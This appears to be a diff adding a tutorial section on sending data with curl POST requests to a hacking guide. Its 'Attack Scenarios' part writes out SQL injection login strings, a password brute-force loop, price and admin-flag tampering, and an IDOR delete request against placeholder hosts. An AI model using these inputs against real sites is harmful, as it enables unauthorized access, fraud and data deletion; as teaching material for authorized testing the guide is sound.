@@ -998,6 +998,218 @@ curl -X POST https://api.target.com/upload \
 
 The base64 string decodes to your PHP payload.
 
+# curl -X POST and -d. Send Data To The Server.
+
+`curl -X POST` changes the request method from GET to POST. `curl -d` adds data to the body of that request. Together they let you submit forms, call APIs, and test login pages directly from the terminal.
+
+---
+
+## What Is A POST Request
+
+A POST request sends data to the server. While GET asks "give me this page", POST says "here is some data, process it". Every login form uses POST. Every search box uses POST. Every contact form uses POST. Every API that creates or updates something uses POST.
+
+The data in a POST request goes in the body. It does not appear in the URL. It is not visible in browser history. It is not logged by default in server access logs.
+
+---
+
+## The Basic Syntax
+
+```bash
+curl -X POST -d "key=value" https://target.com/endpoint
+```
+
+The `-X` flag sets the HTTP method. The `-d` flag adds data to the request body. You can use `-d` multiple times to send multiple fields.
+
+```bash
+curl -X POST -d "name=mhak" -d "age=20" -d "skill=hacking" https://postman-echo.com/post
+```
+
+---
+
+## Different Ways To Send Data
+
+### Form Data
+
+This is the default format. The server receives it like a normal HTML form submission.
+
+```bash
+curl -X POST -d "username=admin&password=test123" https://target.com/login
+curl -X POST -d "search=hacking+tools&category=web" https://target.com/search
+curl -X POST -d "name=Mhak&email=mhak@test.com&message=hello" https://target.com/contact
+```
+
+### JSON Data
+
+APIs expect JSON. You must add the Content-Type header to tell the server what format you are sending.
+
+```bash
+curl -X POST -d '{"username":"admin","password":"test123"}' \
+  -H "Content-Type: application/json" \
+  https://api.target.com/login
+```
+
+### XML Data
+
+Some older APIs and SOAP services use XML.
+
+```bash
+curl -X POST -d '<user><name>Mhak</name><role>admin</role></user>' \
+  -H "Content-Type: application/xml" \
+  https://target.com/api
+```
+
+### Raw Text
+
+You can send any string as the body. No key-value structure needed.
+
+```bash
+curl -X POST -d "just some plain text here" https://postman-echo.com/post
+```
+
+---
+
+## What You Can Do With POST
+
+### Submit Login Forms
+
+Every website with a login page sends credentials via POST. You can test authentication directly.
+
+```bash
+curl -X POST -d "email=admin@test.com&password=admin123" https://target.com/login
+```
+
+### Test Registration Pages
+
+Registration forms also use POST. You can check what the server returns after creating a user.
+
+```bash
+curl -X POST -d "name=test&email=test@test.com&password=test123&confirm=test123" https://target.com/register
+```
+
+### Call APIs
+
+REST APIs use POST for creating resources. You can interact with any API endpoint.
+
+```bash
+curl -X POST -d '{"title":"New Post","content":"Hello World"}' \
+  -H "Content-Type: application/json" \
+  https://api.target.com/posts
+```
+
+### Send Search Queries
+
+Some search features use POST instead of GET. The search term goes in the body.
+
+```bash
+curl -X POST -d "q=cybersecurity+tools" https://target.com/search
+```
+
+---
+
+## How To See What You Sent
+
+Use `-v` to see the full request including the body you sent and the response headers.
+
+```bash
+curl -v -X POST -d "test=hello" https://postman-echo.com/post
+```
+
+Look at the lines starting with `>`. They show your request headers. The Content-Type header tells you what format curl chose. The Content-Length header tells you how much data you sent.
+
+---
+
+## POST vs GET
+
+| Feature | GET | POST |
+|---------|-----|------|
+| Where data goes | URL query string | Request body |
+| Visible in URL | Yes | No |
+| Visible in browser history | Yes | No |
+| Visible in server logs | Yes | Usually not |
+| Maximum length | Around 2000 characters | No practical limit |
+| Bookmarkable | Yes | No |
+| Used for | Retrieving data | Sending data |
+
+---
+
+## Attack Scenarios
+
+### SQL Injection via POST
+
+Login forms are the most common target. The username and password fields are sent via POST. If the server does not sanitize input, SQL injection is possible.
+
+```bash
+curl -X POST -d "user=admin' OR '1'='1&pass=test" https://target.com/login
+curl -X POST -d "user=admin'--&pass=test" https://target.com/login
+```
+
+### Brute Force via POST
+
+You can test multiple passwords against a login form using a loop.
+
+```bash
+for pass in password123 admin123 letmein 123456; do
+  echo "Trying: $pass"
+  curl -s -X POST -d "user=admin&password=$pass" https://target.com/login | grep -i "welcome\|dashboard"
+done
+```
+
+### Parameter Tampering
+
+Some applications trust POST data blindly. You can change prices, roles, or permissions.
+
+```bash
+curl -X POST -d "product_id=123&price=1&admin=true" https://target.com/checkout
+```
+
+### IDOR via POST
+
+If user IDs are sequential, you can access other users' data.
+
+```bash
+curl -X POST -d "user_id=124&action=delete" https://target.com/profile/manage
+```
+
+---
+
+## Common Mistakes
+
+### Forgetting Content-Type With JSON
+
+If you send JSON without the header, the server may not parse it correctly.
+
+```bash
+# Wrong
+curl -X POST -d '{"key":"value"}' https://api.target.com/endpoint
+
+# Correct
+curl -X POST -d '{"key":"value"}' -H "Content-Type: application/json" https://api.target.com/endpoint
+```
+
+### Using GET For Sensitive Data
+
+Never send passwords or tokens in the URL. They will appear in server logs and browser history.
+
+### Not URL Encoding Special Characters
+
+If your data contains `&` or `=` symbols, use `--data-urlencode` instead of `-d`.
+
+```bash
+curl -X POST --data-urlencode "message=Hello & Welcome" https://target.com/submit
+```
+
+---
+
+## Quick Reference
+
+| Command | What It Does |
+|---------|--------------|
+| `curl -X POST -d "key=val" URL` | Send form data |
+| `curl -X POST -d '{"key":"val"}' -H "Content-Type: application/json" URL` | Send JSON |
+| `curl -X POST -d "key1=val1" -d "key2=val2" URL` | Send multiple fields |
+| `curl -X POST --data-urlencode "key=val with spaces" URL` | Send with encoding |
+| `curl -v -X POST -d "key=val" URL` | See full request |
+
 
 
 
